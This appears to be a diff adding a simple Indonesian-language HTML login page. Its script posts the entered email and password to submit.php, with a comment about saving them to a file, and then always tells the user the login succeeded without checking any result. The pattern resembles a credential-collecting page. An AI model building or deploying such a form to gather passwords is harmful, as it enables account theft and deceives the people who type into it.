@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login ke Akun Anda</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 300px;
+            margin: 100px auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+        }
+        h2 {
+            text-align: center;
+            color: #0055a6;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0055a6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #004080;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login ke Akun Anda</h2>
+        <form id="loginForm">
+            <input type="text" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Kata Sandi" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault(); // Mencegah form submit default
+
+            // Ambil data email dan password
+            const email = document.querySelector("input[name='email']").value;
+            const password = document.querySelector("input[name='password']").value;
+
+            // Kirim data ke server atau simpan di file
+            fetch('submit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+            });
+
+            alert("Login berhasil!");
+        });
+    </script>
+</body>
+</html>
